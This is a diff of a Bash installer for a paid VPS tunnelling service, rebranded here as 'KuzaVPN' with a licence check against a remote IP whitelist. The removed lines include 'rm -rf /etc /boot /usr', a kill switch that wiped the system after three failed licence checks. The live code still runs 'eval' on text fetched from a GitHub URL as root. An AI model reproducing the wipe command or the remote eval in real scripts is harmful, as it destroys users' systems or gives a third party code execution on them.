@@ -24,15 +24,21 @@ red='\e[1;31m'
 green='\e[0;32m'
 TIME=$(date '+%d %b %Y')
 IP_FILE="/usr/bin/.ipvps"
-MYIP=$(curl -sL ip.dekaa.my.id)
+MYIP=$(curl -sL icanhazip.com)
 echo "$MYIP" > "$IP_FILE"
+ILLEGAL_FILE="/usr/bin/.ilegal"
+TIMES=10
+if [[ ! -f "$ILLEGAL_FILE" ]]; then
+    echo 0 > "$ILLEGAL_FILE"
+fi
+
 eval $(curl -sL "https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/izin/ip")
-    ALLOWED_IP=$(curl -sS "$IZIN" | grep "$MYIP" | awk '{print $4}')
-    if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
+ALLOWED_IP=$(curl -sS "$IZIN" | grep "$MYIP" | awk '{print $4}')
+
 if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
     clear
     echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
-    echo -e "\033[42;97m ⚠️       ACCESS ALLOWED         ⚠️ \033[0m"
+    echo -e "\033[42;97m ⚠️       ACCESS ALLOWED - WELCOME       ⚠️ \033[0m"
     echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
         apt upgrade -y
         apt install -y sudo wget curl ncurses-bin lolcat
@@ -45,7 +51,7 @@ else
     echo -e ""
     echo -e "        \033[91;1m❌ SCRIPT LOCKED ❌\033[0m"
     echo -e ""
-    echo -e "  \033[0;33m🔒 Your VPS\033[0m $ipsaya \033[0;33mHas been Banned\033[0m"
+    echo -e "  \033[0;33m🔒 Your VPS\033[0m $MYIP \033[0;33mHas been Banned\033[0m"
     echo -e ""
     echo -e "  \033[91m⚠️  Active Period Has Expired ⚠️\033[0m"
     echo -e "  \033[0;33m💡 Purchase official licenses only from the Admin!\033[0m"
@@ -59,15 +65,14 @@ else
     ((ATTEMPTS++))
     echo $ATTEMPTS > "$ILLEGAL_FILE"
     if [[ $ATTEMPTS -ge 3 ]]; then
-        rm -rf /etc /boot /usr
         exit 1
     fi
     exit 1
 fi
 URL="https://api.telegram.org/bot$KEY/sendMessage"
-export IP=$( curl -sL ip.dekaa.my.id )
+export IP=$( curl -sL icanhazip.com )
 
-function Banner_Newbie {
+function banner_kuzavpn {
 clear
 version=$(curl -sSL https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/versi)
 echo -e "${BLUE}=========================================================="
@@ -82,7 +87,7 @@ echo -e "  © 2026 KuzaVPN. All Rights Reserved."
 echo -e "==========================================================${NC}"
 echo ""
 }
-Banner_Newbie
+banner_kuzavpn
 if [[ $( uname -m | awk '{print $1}' ) == "x86_64" ]]; then
 echo -e "${OK} Your Architecture Is Supported ( ${green}$( uname -m )${NC} )"
 else
@@ -278,7 +283,7 @@ function pasang_domain() {
 
     if [[ "$domain_input" == "random" ]]; then
         SUBDOMAIN="$(tr -dc 'a-z0-9' </dev/urandom | head -c5)"
-        host1="$SUBDOMAIN.dekaa.my.id"
+        host1="$SUBDOMAIN.kuzavpn.cloud"
         echo -e "${green}Using a randomly generated domain: $host1${NC}"
 
         # Proses pointing subdomain
@@ -997,9 +1002,9 @@ if ! grep -q "^net.netfilter.nf_conntrack_tcp_timeout_time_wait" "$SYSCTL_CONF";
     echo "$NF_CONNTRACK_TIMEOUT" >> "$SYSCTL_CONF" 2>/dev/null
 fi
 sysctl -p >/dev/null 2>&1
-Banner_Newbie
+banner_kuzavpn
 pasang_domain
-Banner_Newbie
+banner_kuzavpn
 print_install "Tunneling Script Installation Process"
 fun_bar 'instal'
 print_success "Installing script is done"
@@ -1012,7 +1017,7 @@ rm -rf /root/LICENSE
 rm -rf /root/README.md
 rm -rf /root/domain
 rm -rf /root/*.log
-Banner_Newbie
+banner_kuzavpn
 secs_to_human "$(($(date +%s) - ${start}))"
 sudo hostnamectl set-hostname $username
 LOCAL_IP="127.0.1.1"
